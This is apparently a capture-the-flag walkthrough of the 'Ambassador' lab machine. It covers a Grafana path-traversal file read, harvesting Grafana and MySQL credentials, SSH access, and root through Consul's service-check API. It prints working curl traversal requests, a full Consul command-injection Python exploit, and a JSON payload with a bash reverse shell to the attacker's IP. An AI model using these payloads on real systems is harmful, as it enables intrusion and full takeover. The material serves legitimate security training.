tags: lfi database mysql sqlite3 localfileinclusion consul remotecodeexecution reverseshell rce 
On the one hand we have the `22` and `80` ports open as usual.
But on the other hand we have port `3000` which could be hosting some website and `3306`, which as we know is the default port of mysql, so maybe in the future, we can gain access to some database if we get valid credentials.
We proceed to list the website that runs through port `80`, which in this case, is a fairly simple website with nothing interesting:
As I said before, port `3000` could also be running a web service. Well, when we list it, we see that indeed, as soon as we enter, we find a `Grafana 8.2.0` login panel:
The version in use of Grafana is 8.2.0, so we do some research and find an article where it tells us that `Grafana versions 8.0.0-beta1 through 8.3.0` are vulnerable to a Path Traversal:
We found a Python exploit for `Grafana 8.3.0` with a `Path Traversal vulnerability` and analyzed it to exploit it manually, as a real pro.
The exploit essentially enters a `while-true loop`, repeatedly substituting a `random plugin from the list` in each GET request until it receives a status code of `200`, indicating the `file` has been `successfully retrieved`.

<br />


Instead of using the script, I will `randomly select a plugin` from the list and attempt to `access the URL` on Ambassador using curl. I will use the `path-as-is option` to prevent curl from correcting paths like ../. This successfully retrieves `/etc/passwd`, confirming file access.

<br />

```bash
❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/passwd" --path-as-is
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

<br />

# Grafana Configuration Files:

<br />

Now that we have an `LFI`, we proceed to list the paths of the `most interesting files` of this software to try to get `credentials` or something interesting:

<br />

## grafana.ini (/etc/grafana/grafana.ini):

<br />

`Grafana` stores its `configuration` in the `grafana.ini` file, so we proceed to list this file:

<br />

```bash
❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/grafana.ini" --path-as-is
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
```

<br />

Once we have checked that the `file exists`, we proceed to list it again but by the word `"password"` and.... Surprise!! We have the `password` to the `Grafana login panel`!

<br />

```bash
❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/grafana.ini" --path-as-is | grep password
# You can configure the database connection by specifying type, host, name, user and password
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
;password_hint = password
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
; basic_auth_password =
;password =
```

<br />

Log into `Grafana` with the credentials but we `don't see anything interesting` so we keep listing files.

<br />

## mysql.yaml (etc/grafana/provisioning/datasources/mysql.yaml):

<br />

Another interesting file is `mysql.yaml`, since in this type of file we can find `credentials for a database`.

We list the file:

<br />

```bash

❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml" --path-as-is
apiVersion: 1

datasources:
 - name: mysql.yaml 
   type: mysql
   host: localhost
   database: grafana
   user: grafana
   password: dontStandSoCloseToMe63221!
   editable: false
```

<br />

We have another `password`!! It seems to be `mysql's`.

<br />

# Mysql Database Enumeration:

<br />

`Log in` with the new password into the `database remotely` and we list the databases:

<br />

```bash
❯ mysql -h 10.10.11.183 -u grafana -pdontStandSoCloseToMe63221!
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,134 sec)
```

<br />

Looking in `whackywidget` there’s only one table:

<br />

```bash
MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,041 sec)
```

<br />

We list the contents of the table and boom! We have a `base64 credential` for the user `developer`:

<br />

```bash
MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0,043 sec)
```

<br />

Apply a `decode` and try to `log` in via `ssh` to the Victim Machine as this user:

<br />

```bash
❯ echo -n 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==' | base64 -d
anEnglishManInNewYork027468
❯ ssh developer@10.10.11.183
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 04 Jan 2025 01:00:30 PM UTC

  System load:           0.01
  Usage of /:            80.9% of 5.07GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:fe94:166b

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan  4 13:00:20 2025 from 10.10.14.13
developer@ambassador:~$ export TERM=xterm
developer@ambassador:~$ cd /home/developer/
developer@ambassador:~$ cat user.txt
63905ecc389385e918061739f4xxxxxx
```

<br />

We're in!! Intrusion ready, let's go for the Privilege Escalation!!

<br />

# Privilege Escalation: developer -> root 

<br />

## /opt:

We go into de `/opt directory` and find the following:

<br />

```bash
developer@ambassador:/$ ls
bin  boot  dev  development-machine-documentation  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
developer@ambassador:/$ cd /opt
developer@ambassador:/opt$ ls
consul  my-app
```

<br />

The `consul` folder:

<br />

![5](../../../assets/images/Ambassador/5.png)

<br />

The `my_app` folder contains a couple of directories and a `.git repository`, very interesting:

<br />

```bash
developer@ambassador:/opt$ cd my-app/
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

<br />

After doing a `"ps -faux"`, see that the `root` user is `running consul`:

<br />

```bash
root        1098  0.2  3.7 794548 75664 ?        Ssl  11:11   0:20 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

<br />

This is very interesting, because if we `discover any vulnerabilities` for this software, we can most likely `become the root superuser`.

<br />

# Consul Vulnerability (RCE):

<br />

Searching we found this:

<br />

![6](../../../assets/images/Ambassador/6.png)

<br />

As we can see, it is a `vulnerability` that allows us to exploit the `consul API`, but in order to do so we need to `get a token`.


<br />

## Get Token:

<br />

To get the `token` we will simply have to enumerate the `.git repository` that we had seen before in the `my_app` route:

<br />

```bash
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

<br />

Once we have the `token`, we proceed to analyze the exploit to see what it is doing and can `exploit everything manually`.

<br />

## Exploit Analysis:

<br />

What this exploit is basically doing is a request by `curl to a consul endpoint` using `PUT method` and the consul token to `load a file in json` where the `command` we want will be `executed`.

<br />

```python
'''
- Author:      @owalid
- Description: This script exploits a command injection vulnerability in Consul
'''
import requests
import argparse
import time
import random
import string

def get_random_string():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(15))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-th", "--target_host", help="Target Host (REQUIRED)", type=str, required=True)
    parser.add_argument("-tp", "--target_port", help="Target Port (REQUIRED)", type=str, required=True)
    parser.add_argument("-c", "--command", help="Command to execute (REQUIRED)", type=str, required=True)
    parser.add_argument("-s", "--ssl", help="SSL", type=bool, required=False, default=False)
    parser.add_argument("-ct", "--consul-token", help="Consul Token", type=str, required=False)

    args = parser.parse_args()
    protocol = "https" if args.ssl else "http"
    url = f"{protocol}://{args.target_host}:{args.target_port}"
    consul_token = args.consul_token
    command = args.command
    headers = {'X-Consul-Token': consul_token} if consul_token else {}
    
    command_list = command.split(" ")
    id = get_random_string()

    data = {
        'ID': id,
        'Name': 'pwn',
        'Address': '127.0.0.1',
        'Port': 80,
        "Check": {
            "DeregisterCriticalServiceAfter": "90m",
            "Args": command_list,
            'Interval': '10s',
            "Timeout": "86400s",
        }
    }

    registerurl= f"{url}/v1/agent/service/register?replace-existing-checks=true"

    r = requests.put(registerurl, json=data, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error creating check {id}")
        print(r.text)
        exit(1)

    print(f"[+] Check {id} created successfully")
    time.sleep(12)
    desregisterurl = f"{url}/v1/agent/service/deregister/{id}"
    r = requests.put(desregisterurl, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error deregistering check {id}")
        print(r.text)
        exit(1)
    
    print(f"[+] Check {id} deregistered successfully")
```

<br />

## JSON file:

<br />

We `copy` the structure of the `json data` into the exploit and `create our own json file` with the command that we want to execute, in my case, a `reverse shell` to gain a console as `root`:

<br />

```json
{
"ID": "TheBest",
"Name": "pwn",
"Address": "127.0.0.1",
"Port": 80,
"Check": {
	"DeregisterCriticalServiceAfter": "90m",
	"Args":[ "/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.13/443 0>&1" ],
     	"Interval": "10s",
      	"Timeout": "86400s"
}
}
```

<br />

Once we have the `json file` in the `/tmp` path of the `Victim Machine`, we proceed to `execute the following command` to see if we are able to carry out the `rce` and at the same time we listen with `nc on port 443` on our Machine to see if we receive the `Reverse Shell`:

<br />

```bash
developer@ambassador:/tmp/Privesc$ curl -X PUT "http://localhost:8500/v1/agent/service/register" -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" -d "@exploit.json" ; echo
```

<br />

And if everything went well, we should have received a shell session as root on port 443:

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.183] 54048
bash: cannot set terminal process group (2703): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# whoami
whoami
root
root@ambassador:/# cat /root/root.txt
cat /root/root.txt
d676da4e5b0511f4e2ede1df9b8ec6a7
```

<br />

We did it! Rooted Ambassador machine!

I hope you enjoyed it. Keep hacking!❤️

<br />